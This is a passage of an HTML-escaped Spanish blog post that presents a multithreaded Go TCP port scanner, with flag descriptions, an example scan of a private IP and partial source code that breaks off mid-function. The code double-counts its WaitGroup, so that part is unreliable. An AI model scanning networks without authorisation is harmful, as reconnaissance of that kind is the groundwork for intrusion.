        &lt;span class=&quot;n&quot;&gt;Segundos&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;por&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puerto&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Mediante el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-host&lt;/code&gt; especificamos la dirección ip de la máquina objetivo (también podemos especificar un nombre de dominio), con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-threads&lt;/code&gt; especificamos el número de hilos a usar y con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-range&lt;/code&gt; especificamos el rango de puertos a escanear.&lt;/p&gt;

&lt;p&gt;En este caso a modo de ejemplo, efectuaremos un escaneo contra la dirección ip &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.11.12&lt;/code&gt; haciendo uso de 900 hilos (por defecto se escanean todos los puertos [&lt;strong&gt;1-65535&lt;/strong&gt;]):&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;✗&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fastTCPScan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;192.168.11.12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;900&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Escaneando&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;192.168.11.12&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Puerto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;65535&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Abierto&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;902&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Abierto&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;3000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Abierto&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y listo, no tiene mayor misterio.&lt;/p&gt;

&lt;p&gt;Actualmente tira por TCP, pero también se puede configurar para que vaya por UDP… de hecho no sería muy complicado si miráis el código, con unas pequeñas modificaciones ya lo tendríais, ¡esa parte os la dejo a vosotros!.&lt;/p&gt;

&lt;p&gt;Por aquí tenéis el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fastTCPScan.go&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;/*
	Author: s4vitar - https://youtube.com/watch?v=7L1WNU7fBec
*/&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;flag&quot;&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;context&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;// Done() struct{} || &amp;lt;- ctx.Done()&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;strings&quot;&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;strconv&quot;&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;log&quot;&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;sync&quot;&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;time&quot;&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;net&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Host o dirección IP a escanear&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;range&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1-65535&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Rango de puertos a comprobar: 80,443,1-65535,1000-2000, ...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;threads&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Número de hilos a usar&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Duration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;timeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Second&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Segundos por puerto&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processRange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;// c &amp;lt;- elemento&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;blocks&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;range&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blocks&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;rg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxPort&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;error&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;minPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strconv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No ha sido posible interpretar el rango: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;maxPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minPort&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;maxPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strconv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No ha sido posible interpretar el rango: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scanPorts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sync&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WaitGroup&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;wg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;wg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
						&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
					&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scanPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
						&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
					&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}()&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;wg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Wait&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
		&lt;span class=&quot;nb&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
